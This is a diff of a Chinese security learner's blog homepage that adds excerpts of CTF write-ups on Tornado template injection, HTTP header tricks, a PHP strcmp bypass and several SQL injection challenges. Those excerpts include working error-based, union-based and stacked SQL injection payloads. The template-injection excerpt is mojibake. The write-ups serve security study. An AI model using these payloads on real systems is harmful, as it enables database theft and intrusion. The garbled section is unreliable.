@@ -30,7 +30,186 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">阅读</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Icfh</div><div class="header-banner-info__subtitle">目前是一个人菜瘾大的Web安全狗</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/12/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90/">PHP伪协议实战分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-12-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">阅读</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Icfh</div><div class="header-banner-info__subtitle">目前是一个人菜瘾大的Web安全狗</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/12/25/python%E6%A1%86%E6%9E%B6/">python框架学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-12-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-25</span></span></div></header><div class="post-body"><div class="post-excerpt"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/12/22/SSTI/">SSTI</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-12-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-24</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="SSTI���"   >
+          <a href="#SSTI���" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSTI���" class="headerlink" title="SSTI���"></a>SSTI���</h1>
+      <p>SSTI(Server-Side Templates Injection)Ϊ�����ģ��ע��ļ�ơ�</p>
+<p>��������������һ��ͦ�����ͼ��������˵���ǿ��Խ�����������ģ����ִ��</p>
+<p><img src="https://image.3001.net/images/20220428/1651151570_626a92d28a842cc670599.png"></p>
+<p>��CTF�г����������µļ��ֿ�ܣ�</p>
+<p>python:</p>
+<p>Django��Flask��Tornado</p>
+<blockquote>
+<p><em>��ܵ�ѧϰ���ӣ�</em></p>
+<p>1.<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shouce.jb51.net/tornado/index.html" >Tornado���Ž̳�</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+
+        <h1 id="��L��"   >
+          <a href="#��L��" class="heading-link"><i class="fas fa-link"></i></a><a href="#��L��" class="headerlink" title="��Ŀ��"></a>��Ŀ��</h1>
+      
+        <h2 id="pythonƪ"   >
+          <a href="#pythonƪ" class="heading-link"><i class="fas fa-link"></i></a><a href="#pythonƪ" class="headerlink" title="pythonƪ"></a>pythonƪ</h2>
+      
+        <h3 id="Tornado"   >
+          <a href="#Tornado" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tornado" class="headerlink" title="Tornado:"></a>Tornado:</h3>
+      <blockquote>
+<p>��Ŀ:[������ 2018]easy_tornado</p>
+</blockquote>
+<p>��Ŀ����һ��Ŀ¼������</p>
+<p><img src="https://img-blog.csdnimg.cn/fbea74fbceb24699ac42f598080d784e.png"></p>
+<p>����Ŀ¼��</p>
+<blockquote>
+<p>flag.txt ����ṩ�˹���flag���ڵ�Ŀ¼��Ϣ</p>
+</blockquote>
+<blockquote>
+<p>welcome.txt �е�render()������ʾ�������Ŀ���֣���Tornado����µ���Ⱦ����</p>
+</blockquote>
+<blockquote>
+<p>hints.txt �ṩ���ļ���ϣ�Ĺ��췽��</p>
+</blockquote>
+<p>������Ѱ��ģ��ע���ע���</p>
+<p>�����޸�filehash�����һ���������棺</p>
+<p><img src="https://img-blog.csdnimg.cn/142f7a4b18a3406d9324b92019eac985.png"></p>
+<p>�޸�msg�۲����:</p>
+<p><img src="https://img-blog.csdnimg.cn/1e7adbed084f40e5a46da9c0e2685c39.png"></p>
+<p>������һ���Ĺ��ˣ�<br><img src="https://img-blog.csdnimg.cn/f617f94e59ea450b837107e3cc0c5503.png"></p>
+<blockquote>
+<p>���ǵ�Ŀ���ǻ�ȡ��ǰҳ����Դ��cookie_secret</p>
+</blockquote>
+<p>���ƣ�ʹ�ñ���handler���з���settings����</p>
+<blockquote>
+<p>handler —&gt; ��ǰҳ���RequestHandler����</p>
+<p>RequestHandler.settings —&gt; self.application.settings</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/d95e00bde5f94159bf082210b321a8c1.png"></p>
+<p>����ֻҪ��ģ��ע�봦����<code>&#123;&#123;handler.settings&#125;&#125;</code>(Jinja2�﷨)���cookie_secret</p>
+<p>�ο����ӣ�</p>
+<p>1.<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html" >https://www.cnblogs.com/bmjoker/p/13508538.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/12/20/CTF%E6%9D%82%E8%AE%B0/">CTF杂记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-12-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="写在前面"   >
+          <a href="#写在前面" class="heading-link"><i class="fas fa-link"></i></a><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1>
+      <p>学习安全本就是苦行僧修炼的过程。</p>
+<p>平常CTF做题的时候会碰到一些琐碎的知识点。</p>
+<p>特意来记录…</p>
+
+        <h1 id="题目和知识点："   >
+          <a href="#题目和知识点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目和知识点：" class="headerlink" title="题目和知识点："></a>题目和知识点：</h1>
+      
+        <h2 id="1-HTTP请求的请求字段是有顺序的"   >
+          <a href="#1-HTTP请求的请求字段是有顺序的" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-HTTP请求的请求字段是有顺序的" class="headerlink" title="1.HTTP请求的请求字段是有顺序的"></a>1.HTTP请求的请求字段是有顺序的</h2>
+      <blockquote>
+<p>题目： [极客大挑战 2019]Http</p>
+</blockquote>
+<blockquote>
+<p>本题考查的是常见的HTTP请求头：Referer、XFF、UA</p>
+</blockquote>
+<blockquote>
+<p><em>Referer:</em>&gt; 请求页面2资源的请求报文中的Referer字段为URL1<br>(来自哪个网页的链接)</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/8b21686f28394a88842fc71f03e7ccbf.png"></p>
+<blockquote>
+<p><em>X-Forward-For:</em></p>
+</blockquote>
+<blockquote>
+<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。【from wiki】</p>
+</blockquote>
+<blockquote>
+<p>X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理3IP</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/10041d176f974bc89db2a10c71e40b3a.png"></p>
+<p><em>User-Agent:</em><br>用户的浏览器版本信息</p>
+<p><em>附注:</em></p>
+<p>1.HTTP头部注入</p>
+<p><img src="https://pic2.zhimg.com/v2-8561a42c72273589109424b536598361_r.jpg"></p>
+<p>2.HTTP头部的字段是有优先级的</p>
+
+        <h2 id="2-PHP-strcmp-漏洞利用"   >
+          <a href="#2-PHP-strcmp-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-PHP-strcmp-漏洞利用" class="headerlink" title="2. PHP strcmp()漏洞利用"></a>2. PHP strcmp()漏洞利用</h2>
+      <blockquote>
+<p>题目：[极客大挑战 2019]BuyFlag</p>
+</blockquote>
+<p>三叶草出的题。这道题涉及cookie.</p>
+<p>money参数长度的绕过其实可以用科学计数法<code>1e10</code>.</p>
+<p>还可以用一个php的strcmp函数漏洞.</p>
+<p>直入主题:</p>
+<p>PHP_demo:</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP_version:5.6.9</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="string">&quot;1000&quot;</span>, <span class="variable">$password</span>)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;pwn!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/8e77141f0dc149208c9de346fea84c74.png"></p>
+<p>漏洞的绕过利用：在php5.6版本（网上据说7.3版本也有这个错误）上，strcmp()函数原本是希望字符串类型进行比较。如果传入无法转换为字符串的类型（比如数组），那么strcmp会返回0。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/12/18/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-12-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-25</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="写在前面"   >
+          <a href="#写在前面" class="heading-link"><i class="fas fa-link"></i></a><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1>
+      <p>发现很长一段时间不实操sql注入，原理、姿势遗忘得厉害，故记录之…</p>
+<p>记录方式就按照题目来吧！</p>
+
+        <h1 id="题目："   >
+          <a href="#题目：" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1>
+      
+        <h2 id="极客大挑战-2019-HardSQL"   >
+          <a href="#极客大挑战-2019-HardSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2>
+      <p>使用burpsuite进行fuzz,这玩意还ban主机ip了属于是…</p>
+<p>手注一下，发现可以使用报错注入</p>
+<p>直接上SQL注入语句吧!</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),3))#          // 查数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">3</span>))#              <span class="operator">/</span><span class="operator">/</span> 查用户</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.</span></span><br><span class="line"><span class="string">tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),3))#         // 查表名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">3</span>))#<span class="operator">/</span><span class="operator">/</span>查列名</span><br><span class="line">                                                        </span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password,username,id))from(H4rDsq1)),0x7e),3))# // 查列信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(<span class="keyword">right</span>(password,<span class="number">50</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">3</span>))#  <span class="operator">/</span><span class="operator">/</span> 由于回显有长度限制，所以进行选择打印</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p>总结:</p>
+<blockquote>
+<p>1.burpsuite的fuzz进行代理改进</p>
+</blockquote>
+<blockquote>
+<p>2.报错注入的使用：</p>
+<p>updatexml(XML_document, XPath_string, new_value);</p>
+<p>extractvalue(XML_document, Xpath_string)</p>
+</blockquote>
+<blockquote>
+<p>SQL会解析Xpath_string内容，当Xpath的格式发生错误的时候，会返回执行的信息。</p>
+</blockquote>
+<blockquote>
+<p>3.right()函数的使用</p>
+</blockquote>
+
+        <h2 id="GXYCTF2019-BabySQli"   >
+          <a href="#GXYCTF2019-BabySQli" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2>
+      <p>手工注入了一波,把括号给ban了？（玩不起是吧）</p>
+<p>不过发现了以下hint，base系列解码后是一个sql语句</p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>发现只要根据回显来判断user是否存在即可，不难试出为<code>admin</code></p>
+<p>然后没有啥思路了，只好去查源码看看。</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去除转义</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>()) &#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stripslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ?</span><br><span class="line">		<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$value</span>) :</span><br><span class="line">		<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$_POST</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$_GET</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$_COOKIE</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">	<span class="variable">$_REQUEST</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&#x27;SET NAMES UTF8&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"><span class="variable">$t_pw</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="variable">$name</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;do not hack me!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printf</span>(<span class="string">&quot;Error: %s\n&quot;</span>, <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// echo &#x27;&lt;pre&gt;&#x27;;</span></span><br><span class="line">		<span class="variable">$arr</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">		<span class="comment">// print_r($arr);</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;              <span class="comment">// 核心之处</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;wrong pass!&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;wrong user!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>翻了其他师傅的wp，发现是有个新姿势（使用select建立虚拟表的知识）<br>使用select语句在数据库建立一个临时表项，只需要放入pw的md5值通过if即可打印flag。</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name:</span><br><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;# </span><br><span class="line"></span><br><span class="line">pw:</span><br><span class="line">admin</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>总结：</p>
+<blockquote>
+<p>1.sql中的虚拟表：<br>在使用select进行不存在的数据查询时，sql会临时创建这些数据<br>那么我们可以基于此来进行类似于注册的思路。</p>
+</blockquote>
+
+        <h2 id="GYCTF2020-Blacklist"   >
+          <a href="#GYCTF2020-Blacklist" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2>
+      <p>手注，发现存在黑名单的正则过滤，且忽略大小写</p>
+<p><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
+<p>考虑使用堆叠注入.</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#			//查库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span>;<span class="keyword">show</span> tables;#   			<span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from FlagHere;#     //查列</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></div></figure>
+<p>查库：<br><img src="https://img-blog.csdnimg.cn/f2014ed3e3ea491bba23c03d9f8a31e0.png"></p>
+<p>查表<br><img src="https://img-blog.csdnimg.cn/931baf8cb6b34cc59abeeb22214aab8e.png"></p>
+<p>查列：<br><img src="https://img-blog.csdnimg.cn/b5e08e55340340d28e6c43f5601c0f1a.png"></p>
+<p>handler(句柄)姿势:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1&#x27;;handler FlagHere as file;handler file read next;handler file close;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/0aba438313cd4d60a9131e5cfad8e29c.png"></p>
+<p>总结：</p>
+<ol>
+<li><p>show堆叠注入</p>
+</li>
+<li><p>handler文件句柄姿势对于select的替代</p>
+</li>
+</ol>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/12/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90/">PHP伪协议实战分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-12-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h2 id="一-什么是PHP伪协议"   >
           <a href="#一-什么是PHP伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#一-什么是PHP伪协议" class="headerlink" title="一.什么是PHP伪协议"></a>一.什么是PHP伪协议</h2>
       <p>PHP伪协议是PHP内置的具有URL风格的封装协议，可以实现特定功能</p>
@@ -188,7 +367,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
       <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></div></figure>
 
